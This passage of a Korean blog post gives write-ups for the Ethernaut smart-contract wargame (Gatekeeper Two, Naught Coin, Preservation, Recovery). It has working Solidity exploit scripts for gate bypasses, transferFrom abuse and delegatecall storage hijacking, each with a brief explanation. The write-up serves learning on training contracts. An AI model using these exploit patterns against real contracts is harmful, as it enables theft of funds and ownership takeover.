                <span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">enter(bytes8)</span><span class="dl">"</span><span class="p">,</span> <span class="nx">_gateKey</span><span class="p">)</span>
            <span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">success</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">solved</span><span class="dl">"</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">entrant : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">gatekeeperOne</span><span class="p">.</span><span class="nf">entrant</span><span class="p">());</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// script/exploit.sol</span>

<span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">,</span> <span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Exploit</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../script/exploit.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Solve</span> <span class="nx">is</span> <span class="nx">Test</span> <span class="p">{</span>
    <span class="nx">Exploit</span> <span class="kr">public</span> <span class="nx">exploit</span><span class="p">;</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
        <span class="nx">exploit</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Exploit</span><span class="p">();</span>
        <span class="nx">exploit</span><span class="p">.</span><span class="nf">exploit</span><span class="p">();</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// test/Solve.sol</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="gatekeeper-two"><span class="me-2">Gatekeeper Two</span><a href="#gatekeeper-two" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">,</span> <span class="nx">console2</span><span class="p">,</span> <span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">GatekeeperTwo</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Challenge.sol</span><span class="dl">"</span><span class="p">;</span>


<span class="nx">contract</span> <span class="nx">Exploit</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="nx">CHALLENGE_ADDR</span> <span class="o">=</span> <span class="mh">0x858F8919bB5D87746650D8c3F80c32AF321b0f1f</span><span class="p">;</span>
    <span class="nx">GatekeeperTwo</span> <span class="kr">public</span> <span class="nx">gatekeeperTwo</span><span class="p">;</span>

    <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">gatekeeperTwo</span> <span class="o">=</span> <span class="nc">GatekeeperTwo</span><span class="p">(</span><span class="nx">CHALLENGE_ADDR</span><span class="p">);</span>
        <span class="nx">bytes8</span> <span class="nx">gateKey</span> <span class="o">=</span> <span class="nf">bytes8</span><span class="p">(</span><span class="nf">uint64</span><span class="p">(</span><span class="nf">bytes8</span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodePacked</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))))</span> <span class="o">^</span> <span class="nf">type</span><span class="p">(</span><span class="nx">uint64</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">entrant : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">gatekeeperTwo</span><span class="p">.</span><span class="nf">entrant</span><span class="p">());</span>
        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nx">gatekeeperTwo</span><span class="p">).</span><span class="nf">call</span><span class="p">(</span>
                <span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">enter(bytes8)</span><span class="dl">"</span><span class="p">,</span> <span class="nx">gateKey</span><span class="p">)</span>
            <span class="p">);</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">entrant : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">gatekeeperTwo</span><span class="p">.</span><span class="nf">entrant</span><span class="p">());</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// script/exploit.sol</span>

<span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">,</span> <span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Exploit</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../script/exploit.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Solve</span> <span class="nx">is</span> <span class="nx">Test</span> <span class="p">{</span>
    <span class="nx">Exploit</span> <span class="kr">public</span> <span class="nx">exploit</span><span class="p">;</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
        <span class="nx">exploit</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Exploit</span><span class="p">();</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// test/Solve.sol</span>
</pre></td></tr></tbody></table></code></div></div>
<p>첫 번째 조건은 One과 동일하며 두 번째 조건은 <code class="language-plaintext highlighter-rouge">extcodesize()</code>의 값이 0이어야 하는데 이는 컨트랙트 생성자가 생성되는 동안에는 아직 블록체인에 저장되지 않은 상태이기 때문에 <code class="language-plaintext highlighter-rouge">extcodesize()</code>가 0이 된다. 그리고 마지막은 그냥 단순히 역연산이다.</p>

<h2 id="naught-coin"><span class="me-2">Naught Coin</span><a href="#naught-coin" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>pragma solidity ^0.8.13;

import {NaughtCoin} from "./challenge.sol";

contract Exploit {
    address CHALLENGE_ADDR = 0x30c30Bfe60B6133a4dF76581820e59d5700Af7BF;
    address MY_ADDR = 0x3a7D6Bc6f933eB5207c5C4Fe5ef47ad63815919c;

    NaughtCoin public naughtcoin;

    constructor(){
        naughtcoin = NaughtCoin(CHALLENGE_ADDR);
    }

    function exploit() public {
        uint256 token_balance = naughtcoin.balanceOf(MY_ADDR);
        naughtcoin.transferFrom(MY_ADDR, address(this), token_balance);
    }
}
// await contract.allowance(palyer, "0xA84EA6f3c8c327Bb1c2BaAE1f0eF08Ac0f16F47a")
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">transfer()</code> 함수는 사용을 할 수 없지만 ERC 20 표준에서는  토큰 소유자가 아닌 다른 계정이 토큰 소유자를 대신하여 토큰을 전송할 수 있도록 허용하는 함수인 <code class="language-plaintext highlighter-rouge">transferFrom()</code> 함수를 제공한다.  그래서 공격용 컨트랙트에 사용할 수 있는 토큰을 설정하고, 공격용 컨트랙트에서 빼내면 된다.</p>

<h2 id="preservation"><span class="me-2">Preservation</span><a href="#preservation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">20</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">,</span> <span class="nx">console2</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Preservation</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Challenge.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">FakeTimeZone</span> <span class="p">{</span>
    <span class="c1">// stores a timestamp</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">timeZone1Library</span><span class="p">;</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">timeZone2Library</span><span class="p">;</span>
    <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>

    <span class="kd">function</span> <span class="nf">setTime</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">_time</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">owner</span> <span class="o">=</span> <span class="nx">_time</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Exploit</span><span class="p">{</span>
    <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">storedTime</span><span class="p">;</span>
    <span class="nx">bytes4</span> <span class="nx">constant</span> <span class="nx">setTimeSignature</span> <span class="o">=</span> <span class="nf">bytes4</span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span><span class="dl">"</span><span class="s2">setTime(uint256)</span><span class="dl">"</span><span class="p">));</span>
    <span class="nx">address</span> <span class="nx">CHALLENGE_ADDR</span> <span class="o">=</span> <span class="mh">0x618e2851eFD87E43239FC63843Ff375Be1a4a10a</span><span class="p">;</span>
    <span class="nx">address</span> <span class="nx">user</span> <span class="o">=</span> <span class="mh">0x3a7D6Bc6f933eB5207c5C4Fe5ef47ad63815919c</span><span class="p">;</span>
    <span class="nx">Preservation</span> <span class="kr">public</span> <span class="nx">preservation</span><span class="p">;</span>
    <span class="nx">FakeTimeZone</span> <span class="kr">public</span> <span class="nx">fakeTimeZone</span><span class="p">;</span>

    <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">preservation</span> <span class="o">=</span> <span class="nc">Preservation</span><span class="p">(</span><span class="nx">CHALLENGE_ADDR</span><span class="p">);</span>
        <span class="nx">fakeTimeZone</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FakeTimeZone</span><span class="p">();</span>
        <span class="nx">storedTime</span> <span class="o">=</span> <span class="nf">uint256</span><span class="p">(</span><span class="nf">uint160</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">fakeTimeZone</span><span class="p">)));</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">exploit</span> <span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">libraryContract address : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">fakeTimeZone</span><span class="p">));</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">timeZone1Library : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">preservation</span><span class="p">.</span><span class="nf">timeZone1Library</span><span class="p">());</span>
        <span class="nx">preservation</span><span class="p">.</span><span class="nf">setFirstTime</span><span class="p">(</span><span class="nx">storedTime</span><span class="p">);</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">timeZone1Library : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">preservation</span><span class="p">.</span><span class="nf">timeZone1Library</span><span class="p">());</span>
        <span class="nx">storedTime</span> <span class="o">=</span> <span class="nf">uint256</span><span class="p">(</span><span class="nf">uint160</span><span class="p">(</span><span class="nx">user</span><span class="p">));</span>
        <span class="nx">preservation</span><span class="p">.</span><span class="nf">setFirstTime</span><span class="p">(</span><span class="nx">storedTime</span><span class="p">);</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">owner : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">preservation</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>       
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// script/exploit.sol</span>
</pre></td></tr></tbody></table></code></div></div>
<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">20</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">,</span> <span class="nx">console2</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Exploit</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../script/exploit.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Solve</span> <span class="nx">is</span> <span class="nx">Test</span> <span class="p">{</span>
    <span class="nx">Exploit</span> <span class="kr">public</span> <span class="nx">exploit</span><span class="p">;</span>
    
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
        <span class="nx">exploit</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Exploit</span><span class="p">();</span>
        <span class="nx">exploit</span><span class="p">.</span><span class="nf">exploit</span><span class="p">();</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// test/Solve.sol</span>
</pre></td></tr></tbody></table></code></div></div>
<p>문제를 해결하기 위해서는 owner 을 공격자의 주소로 변경해 주어야 한다. 그러나 문제에서는 <code class="language-plaintext highlighter-rouge">timeZone1Library</code>/<code class="language-plaintext highlighter-rouge">timeZone2Library</code>의 <code class="language-plaintext highlighter-rouge">delegatecall()</code> 함수를 통해서 slot 0의 데이터를 변경하고 있다. 이렇게 되면 <code class="language-plaintext highlighter-rouge">timeZone1Library</code> 변수의 값을 변경할 수 있는데, <code class="language-plaintext highlighter-rouge">timeZone1Librar</code>의 값을 공격자의 컨트랙트로 주어 악성 컨트랙트를 위임해 주게 하면 된다.</p>

<h2 id="recovery"><span class="me-2">Recovery</span><a href="#recovery" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">20</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">,</span> <span class="nx">console2</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Recovery</span><span class="p">,</span> <span class="nx">SimpleToken</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Challenge.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="c1">//import {Exploit} from "../script/exploit.sol";</span>

<span class="nx">contract</span> <span class="nx">Solve</span> <span class="nx">is</span> <span class="nx">Test</span> <span class="p">{</span>
    <span class="nx">Recovery</span> <span class="kr">public</span> <span class="nx">recovery</span><span class="p">;</span>
    <span class="nx">SimpleToken</span> <span class="kr">public</span> <span class="nx">simpletoken</span><span class="p">;</span>

    <span class="nx">address</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nf">envAddress</span><span class="p">(</span><span class="dl">"</span><span class="s2">user1</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">address</span> <span class="nx">challenge</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nf">envAddress</span><span class="p">(</span><span class="dl">"</span><span class="s2">challenge</span><span class="dl">"</span><span class="p">);</span>
    
    <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">createSelectFork</span><span class="p">((</span><span class="nx">vm</span><span class="p">.</span><span class="nf">rpcUrl</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envString</span><span class="p">(</span><span class="dl">"</span><span class="s2">SEPOLIA</span><span class="dl">"</span><span class="p">))));</span>
        <span class="nx">simpletoken</span> <span class="o">=</span> <span class="nc">SimpleToken</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="mh">0x5CD423E582b2059751CdE22e93B936f05eB9c4F9</span><span class="p">));</span>
        <span class="c1">//recovery = Recovery(challenge);</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATEKEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">simpletoken</span><span class="p">.</span><span class="nf">destroy</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="nx">user</span><span class="p">));</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// test/Solve.sol</span>
<span class="c1">// etherscan으로 주소 확인하거나 주소 만들어지는 방식 이해해서 계산</span>
</pre></td></tr></tbody></table></code></div></div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/wargame/">Wargame</a>
      </div>
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Ethernaut%20Write%20Ups%20-%20Web3.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fethernaut%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Ethernaut%20Write%20Ups%20-%20Web3.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fethernaut%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fethernaut%2F&text=Ethernaut%20Write%20Ups%20-%20Web3.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get the last 5 posts from lastmod list. -->















              <!-- The trending tags list -->


















            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  
    











            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/ERC1337-DH/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Dreamhack CTF (ERC1337)</p>
    </a>
  

  
    <a
      href="/posts/flashloan-aave/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Simple FlashLoan, Based on Aave V3</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2025</time>
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->


















    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.21.3/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

